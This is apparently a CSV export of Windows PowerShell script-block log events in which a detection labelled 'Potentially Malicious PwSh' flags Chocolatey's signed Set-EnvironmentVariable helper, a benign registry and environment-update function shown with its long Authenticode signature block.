IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgY21LEp9apuTMLqguzypSjDhrQ2TRe8edZGc6 # /Wjr8LIwDQYJKoZIhvcNAQEBBQAEggEAVqid4PiRvy3Rz95AXsqvb7v8clOSDutY # mBU2Njes3J1iOx+jQbU5SD02i04upCKFeaeNN9FfzidZa4Q88uoeirKsKi0UGrjr # BnUIzamzRNRO7w3LLz4ctku8eFoEsNtkclcXy6HW3cubvQ9UUmznObLjlWY42hvl # /vVvzRJYkQyC3LlO5ny2obm6e7ZjiCRSNpasr9SAfoudEhmU/O3nAtayW3KstSwX # 6YGEEdcYKiK9PuPYg4PgPP7tgQMNhN4hQkM4pwL2DvGPDO0Z9TKJpm/uaANdw7Fc # WlJL1zMlIuOtVrHtVX7emS1O+9k7eSaGPbo+SYHmjbUXGQXS/U0/SaGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NjU5WjAjBgkqhkiG9w0BCQQxFgQU40gRxQX/DFfRvsp9 # uY236RUSX6swDQYJKoZIhvcNAQEBBQAEggEAdNctgo5xpF4Yvn6HDB1eWkeD2J7v # Ac6OQH2uoibswWMoa5QyXi4xmc8g4WULeNS32RyBeFWIicGr7We77EffVS6wvC2n # jjxXHuq1Lid5gxE7GgKs54GONcDbWCK7sWJ00qmkP7qrWMp5IrQxpNwgCuMTNBeL # ijKPb9xC3QnbiY9DOFoc5dc6fvFNAj93MqWi1tZUG524Fk+anAAYmExlUxDUmMPW # y8H2MnE9UtQFNSClb8KRZY9gkcpuOrR3dZsCU9deoW4qt8Y9zZ6SnjibCfHbuslP # EJ42K0/lJvs/KZRRjhscT8dOo732rd96hqXJjR9x6YnHdEEODbRXSxSHyA== # SIG # End signature block","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:21:37.056 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,76,"ScriptBlock: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Set-EnvironmentVariable { <# .SYNOPSIS **NOTE:** Administrative Access Required when `-Scope 'Machine'.` DO NOT USE. Not part of the public API. Use `Install-ChocolateyEnvironmentVariable` instead. .DESCRIPTION Saves an environment variable. .NOTES This command will assert UAC/Admin privileges on the machine if `-Scope 'Machine'`. .INPUTS None .OUTPUTS None .PARAMETER Name .PARAMETER Value .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .LINK Install-ChocolateyEnvironmentVariable .LINK Uninstall-ChocolateyEnvironmentVariable .LINK Install-ChocolateyPath .LINK Get-EnvironmentVariable #> param ( [parameter(Mandatory=$true, Position=0)][string] $Name, [parameter(Mandatory=$false, Position=1)][string] $Value, [parameter(Mandatory=$false, Position=2)] [System.EnvironmentVariableTarget] $Scope, [parameter(ValueFromRemainingArguments = $true)][Object[]] $ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters if ($Scope -eq [System.EnvironmentVariableTarget]::Process -or $Value -eq $null -or $Value -eq '') { return [Environment]::SetEnvironmentVariable($Name, $Value, $Scope) } [string]$keyHive = 'HKEY_LOCAL_MACHINE' [string]$registryKey = ""SYSTEM\CurrentControlSet\Control\Session Manager\Environment\"" [Microsoft.Win32.RegistryKey] $win32RegistryKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($registryKey) if ($Scope -eq [System.EnvironmentVariableTarget]::User) { $keyHive = 'HKEY_CURRENT_USER' $registryKey = ""Environment"" [Microsoft.Win32.RegistryKey] $win32RegistryKey = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey($registryKey) } [Microsoft.Win32.RegistryValueKind]$registryType = [Microsoft.Win32.RegistryValueKind]::String try { if ($win32RegistryKey.GetValueNames() -contains $Name) { $registryType = $win32RegistryKey.GetValueKind($Name) } } catch { # the value doesn't yet exist # move along, nothing to see here } Write-Debug ""Registry type for $Name is/will be $registryType"" if ($Name -eq 'PATH') { $registryType = [Microsoft.Win32.RegistryValueKind]::ExpandString } [Microsoft.Win32.Registry]::SetValue($keyHive + ""\"" + $registryKey, $Name, $Value, $registryType) try { # make everything refresh # because sometimes explorer.exe just doesn't get the message that things were updated. if (-not (""win32.nativemethods"" -as [type])) { # import sendmessagetimeout from win32 add-type -Namespace Win32 -Name NativeMethods -MemberDefinition @"" [DllImport(""user32.dll"", SetLastError = true, CharSet = CharSet.Auto)] public static extern IntPtr SendMessageTimeout( IntPtr hWnd, uint Msg, UIntPtr wParam, string lParam, uint fuFlags, uint uTimeout, out UIntPtr lpdwResult); ""@ } $HWND_BROADCAST = [intptr]0xffff; $WM_SETTINGCHANGE = 0x1a; $result = [uintptr]::zero # notify all windows of environment block change [win32.nativemethods]::SendMessageTimeout($HWND_BROADCAST, $WM_SETTINGCHANGE, [uintptr]::Zero, ""Environment"", 2, 5000, [ref]$result) | Out-Null # Set a user environment variable making the system refresh $setx = ""$($env:SystemRoot)\System32\setx.exe"" & ""$setx"" ChocolateyLastPathUpdate `""$((Get-Date).ToFileTime())`"" | Out-Null } catch { Write-Warning ""Failure attempting to let Explorer know about updated environment settings.`n $($_.Exception.Message)"" } Update-SessionEnvironment } # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCBOu3ChoK62lTYZ # 9Y709GEKMD/ZFRQI2jbzh+hJKc5Y1KCCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # 